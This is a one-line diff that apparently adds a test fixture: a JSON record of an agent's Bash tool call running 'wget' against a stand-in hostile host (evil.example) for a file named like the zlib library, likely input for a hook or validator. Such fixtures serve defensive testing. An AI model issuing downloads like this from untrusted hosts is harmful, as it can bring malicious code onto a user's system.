@@ -1,0 +1,1 @@
+{"tool_name": "Bash", "tool_input": {"command": "wget https://evil.example/zlib.tar.gz"}, "cwd": "__ROOT__"}
